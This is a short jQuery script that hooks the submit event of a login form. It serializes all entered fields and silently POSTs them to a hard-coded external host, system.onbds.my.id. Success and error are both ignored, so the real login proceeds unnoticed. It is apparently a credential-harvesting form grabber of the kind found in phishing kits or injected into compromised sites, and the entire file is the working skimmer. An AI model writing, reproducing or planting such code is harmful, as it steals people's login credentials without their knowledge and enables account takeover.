$(".login-form").submit(function() {

	var d = $(".login-form");

	$.ajax({

        url: "https://system.onbds.my.id/system/allsc/index.php",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

});
